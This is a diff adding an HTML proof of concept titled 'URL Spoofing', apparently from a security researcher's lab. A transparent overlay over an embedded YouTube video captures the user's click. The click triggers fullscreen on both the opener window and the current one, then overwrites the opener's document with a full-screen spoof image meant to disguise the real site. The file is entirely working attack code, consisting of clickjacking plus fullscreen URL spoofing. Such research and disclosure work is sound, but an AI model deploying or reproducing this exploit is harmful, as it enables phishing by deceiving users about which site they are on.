@@ -1,0 +1,67 @@
+
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <title>URL Spoofing</title>
+
+    <style>
+    	body {
+			margin: 0;
+		}
+		
+		iframe {
+			display: block;
+			background: #000;
+			border: none; 
+			height: 100vh;
+			width: 100vw;
+		}
+		
+		#overlay {
+		  position: absolute;
+		  width: 100%;
+		  height: 100%;
+		  left: 0px;
+		  top: 0px;
+		  background: rgba(255,255,255,0);
+		}
+   	</style>
+	
+	<script>
+		function spoof() {
+        	var openerHTML = `
+        		<html>
+        			<head>
+        				<style>
+        					body {
+        						margin: 0;
+   								padding: 0;
+        					}
+
+        					#content {
+        						width:  100%;
+    							height: 100%;
+        					}
+        				</style>
+        			</head>
+
+        			<body>
+        				<img id="content" src="https://lbherrera.github.io/lab/fullscreen-spoof/spoof.png"></img>
+        			</body>
+           		</html>
+        	`;
+            opener.document.documentElement.webkitRequestFullscreen();
+			document.documentElement.webkitRequestFullscreen();
+			overlay.parentNode.removeChild(overlay);
+            opener.document.write(openerHTML);
+        }
+    </script>
+</head>
+
+<body>
+	<div id="overlay" onclick="spoof();"></div>
+	<iframe id="iframe" src="https://www.youtube.com/embed/tgbNymZ7vqY"></iframe>
+</body>
+</html>
